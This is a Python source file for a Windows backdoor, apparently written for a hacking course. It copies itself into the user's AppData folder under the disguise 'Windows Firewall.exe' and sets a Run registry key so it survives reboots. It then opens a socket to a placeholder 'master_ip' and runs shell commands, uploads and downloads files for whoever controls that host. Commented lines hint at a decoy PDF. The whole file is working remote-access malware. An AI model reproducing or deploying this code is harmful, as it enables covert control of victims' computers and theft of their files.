import base64
import json
import os
import shutil
import socket
import subprocess
import sys

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        backdoor_location = os.environ["appdata"] + "\\Windows Firewall.exe"

        if not os.path.exists(backdoor_location):
            shutil.copyfile(sys.executable, backdoor_location)
            subprocess.call("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v fwall /t REG_SZ /d \"" + backdoor_location + "\"", shell = True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""

        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
        
    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, "wb")
        return subprocess.check_output(command, shell = True, stderr = DEVNULL, stdin = DEVNULL)

    def change_workdir(self, path):
        os.chdir(path)
        return "\033[92m[+]\033[0m Changing workdir to " + path

    def read_file(self, path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())

    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            return "\033[92m[+]\033[0m Download successful."

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_workdir(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "\033[91m[-]\033[0m Error during command execution!"

            self.reliable_send(command_result)

if __name__ == "__main__":
    try:
        #file_name = sys._MEIPASS + "\file.pdf"
        #subprocess.Popen(file_name, shell = True)
        backdoor = Backdoor("master_ip", 8080)
        backdoor.run()
    except Exception:
        sys.exit()
